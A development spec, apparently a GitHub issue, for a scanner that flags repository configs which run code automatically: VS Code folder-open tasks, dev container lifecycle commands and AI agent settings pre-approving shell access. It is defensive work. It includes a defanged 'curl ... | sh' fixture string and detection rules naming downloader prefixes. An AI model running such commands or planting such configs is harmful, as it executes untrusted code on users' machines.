# Day 5 — Auto-run trap detector

**Issue:** [#293](https://github.com/DepRadarOrg/DepRadar/issues/293) ·
**Depends on:** Day 4 (merged first) ·
**Relevant files:** `src/` (new module, e.g. `src/repo_scan/autorun.rs`)

## Goal

Flag configuration files that make code run when someone opens, builds a
container for, or points an AI agent at the repository. PolinRider used
these files so that cloning and opening a repo was enough to run its
payload.

**Acceptance test:** each trap type has a fixture and a clear remediation
message.

## What to detect

Each trap is its own finding kind. Each finding carries a fixed
remediation string that says what to change, not just what is wrong.

### 1. VS Code tasks that run on folder open

Files: `.vscode/tasks.json`, and the `tasks` key of any `*.code-workspace`
file.

Flag a task whose `runOptions.runOn` is `"folderOpen"`. Include the
task's `label` and its `command` (plus `args`) in the message. Run the
command text through `behavioral::network::scan_script`. If that returns
anything (for example a download piped into a shell), raise the
severity to that finding's level.

**Remediation:** "Remove `runOptions.runOn: folderOpen` from task
'<label>', or document why it must run on open. Tasks that run on open
execute as soon as someone trusts the folder."

### 2. `task.allowAutomaticTasks`

Files: `.vscode/settings.json`, and the `settings` key of any
`*.code-workspace` file.

Flag `"task.allowAutomaticTasks": "on"`. This setting turns off the prompt
that would otherwise ask before an automatic task runs. A repository has
no legitimate reason to set it for its users, whether or not a given
editor version honors it at workspace scope.

If a folder-open task (check 1) appears in the same repo, the combination
means a task runs with no prompt at all. Report one combined finding at a
higher severity rather than two separate ones.

**Remediation:** "Remove `task.allowAutomaticTasks` from the workspace
settings. Each user should make this choice in their own user settings."

### 3. Dev container lifecycle commands

Files: `.devcontainer/devcontainer.json`,
`.devcontainer/<name>/devcontainer.json`, and `.devcontainer.json` at the
repo root.

Keys: `initializeCommand`, `onCreateCommand`, `updateContentCommand`,
`postCreateCommand`, `postStartCommand`, `postAttachCommand`. Each value
can be a string, an array (`["npm", "ci"]`), or an object that maps names
to strings or arrays. Handle all three forms.

- **`initializeCommand` runs on the host machine**, before the container
  exists, so it can reach the user's real files. Rate it higher than the
  rest.
- The other commands run inside the container. Most are benign (`npm ci`,
  `pip install -r requirements.txt`). Report them at low severity. Raise
  the severity when `network::scan_script` matches, or when the command
  runs a file from the repo. Read that file with the same
  path-containment rules `network::scan_package` uses: no absolute paths,
  no `..`.

**Remediation:** "Review `<key>` in `<file>`. `initializeCommand` runs on
your machine, not in the container. Move setup into the container (for
example `postCreateCommand`) or remove it."

### 4. Agent configs that pre-approve shell access

Files: `.claude/settings.json` and `.claude/settings.local.json`. The
second file is normally gitignored, so a committed copy is suspicious in
itself.

Flag any of these:
- a `permissions.allow` entry of `Bash`, `Bash(*)` or `Bash(:*)`. Each
  one approves every shell command;
- `permissions.defaultMode` of `bypassPermissions`;
- a `hooks` entry. Hooks run shell commands on agent events with no
  prompt. Scan the hook's command text with `network::scan_script` as in
  check 1.

**Don't flag** narrow rules such as `Bash(cargo test:*)` or
`Bash(npm run lint)`. They are a normal, deliberate configuration. Do
raise the severity of a narrow rule whose prefix is itself a downloader or
interpreter: `Bash(curl:*)`, `Bash(sh:*)`, `Bash(node -e:*)`.

Keep agent file paths and rules in a `const` table, so other agents can be
added later. **Only add a format whose documentation you have checked.**
Don't guess another tool's config schema.

**Remediation:** "`<file>` pre-approves unrestricted shell access for
anyone who runs an AI agent in this repo. Replace `Bash` with the specific
commands the project needs (for example `Bash(cargo test:*)`), or move the
setting to a local, uncommitted file."

## Parsing: these files are JSONC

`tasks.json`, `settings.json`, `devcontainer.json` and `*.code-workspace`
allow **comments and trailing commas**. `serde_json` rejects both, and the
real-world fixtures below will have them. Before parsing:

- strip `//` and `/* */` comments outside strings;
- remove a `,` that is followed (after whitespace) by `}` or `]`.

Write a small helper with its own unit tests (a comment inside a string must
survive, and so must an escaped quote), or use a JSONC crate if the
maintainers approve the dependency. A file that still fails to parse after
that gets no findings. Don't abort the scan.

## Severity

| Trap | Level |
|---|---|
| Folder-open task | **High** |
| Folder-open task + `allowAutomaticTasks: on` | **Critical** |
| `allowAutomaticTasks: on` alone | **Medium** |
| `initializeCommand` | **High** |
| Other dev container lifecycle command | **Low** (raised by network or script matches) |
| Agent `Bash` / `Bash(*)` / `bypassPermissions` | **High** |
| Agent hook | **Medium** (raised by network matches) |
| Committed `.claude/settings.local.json` | **Medium** |

Add these rows to [docs/severity.md](../severity.md).

## Fixtures

All of these must be defanged. Every command is `echo defanged`, or a
`curl https://example.invalid/x | sh` string that the scanner only reads.

**Positive (must flag), one or more per trap:**
- `tasks.json` with a folder-open task, written **with comments and a
  trailing comma**.
- `tasks.json` with a folder-open task whose command is a download piped to
  a shell. Its severity must come from the network scan.
- `settings.json` with `allowAutomaticTasks: on`, together with the task
  above. This is the combined Critical case.
- A `.code-workspace` file that has both tasks and settings inline.
- `devcontainer.json` with a string-form `initializeCommand`, plus
  array-form and object-form lifecycle commands.
- `.claude/settings.json` with `"allow": ["Bash"]`, one with
  `bypassPermissions`, and one with a hook.

**Negative (must not flag):**
- `tasks.json` with build and test tasks and no `runOn`, or with
  `"runOn": "default"`.
- `settings.json` with ordinary editor settings, or with
  `allowAutomaticTasks: off`.
- `devcontainer.json` with only `image` and `customizations`.
- `.claude/settings.json` with only narrow rules (`Bash(cargo test:*)`,
  `Read`, `Edit`).

## Known traps

- **This repo trips its own detector.** DepRadar commits
  [`.claude/settings.json`](../../.claude/settings.json) with
  `"allow": ["Bash", …]`. Day 5 will flag it, which breaks Day 1's
  "self-scan produces an empty SARIF" result. Raise this on the issue
  before merging. The maintainers can narrow the rule (preferred: it is
  the exact problem the detector reports), or accept it with a
  documented exclusion. Don't quietly special-case the path in code.
- **Self-scan of fixtures.** Handle it the same way as Day 3.
- **Paths are case-sensitive on Linux** but not on macOS or Windows. Match
  `.vscode/` and `.devcontainer/` case-insensitively so a `.VSCode/` folder
  can't be used to slip past the scanner.

## Out of scope

- `.mcp.json` server definitions, git hooks under `.husky/`, and
  `Makefile` default targets. They are worth considering for a later day,
  but none of them runs code just because the folder was opened.
- `package.json` lifecycle scripts. That is Day 6.
